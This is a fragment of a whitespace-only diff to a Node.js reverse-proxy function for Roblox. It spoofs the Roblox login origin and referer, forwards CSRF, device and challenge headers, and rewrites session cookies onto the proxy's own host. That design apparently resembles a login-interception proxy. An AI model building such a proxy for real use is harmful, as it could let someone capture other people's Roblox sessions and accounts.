         changeOrigin: true,
@@ -895,7 +1027,7 @@ function createRobloxProxy(prefix, target) {
         proxyTimeout: 30000,
         timeout: 30000,
         agent,
-
+        
         on: {
             proxyReq: (proxyReq, req) => {
                 // For Arkose/rbxcdn, use their own origin/referer
@@ -907,18 +1039,18 @@ function createRobloxProxy(prefix, target) {
                     proxyReq.setHeader('origin', 'https://www.roblox.com');
                     proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                 }
-
+                
                 proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                 proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                 proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                 proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                 proxyReq.setHeader('connection', 'keep-alive');
-
+                
                 if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                 if (req.headers['rbx-device-id']) proxyReq.setHeader('rbx-device-id', req.headers['rbx-device-id']);
                 if (req.headers['rbxdeviceid']) proxyReq.setHeader('rbxdeviceid', req.headers['rbxdeviceid']);
                 if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
-
+                
                 for (const h of CHALLENGE_HEADERS) {
                     if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                 }
@@ -929,7 +1061,7 @@ function createRobloxProxy(prefix, target) {
                     const host = req.headers.host || 'localhost';
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                 }
-
+                
                 const origin = req.headers['origin'] || `https://${req.headers.host}`;
                 proxyRes.headers['access-control-allow-origin'] = origin;
                 proxyRes.headers['access-control-allow-credentials'] = 'true';
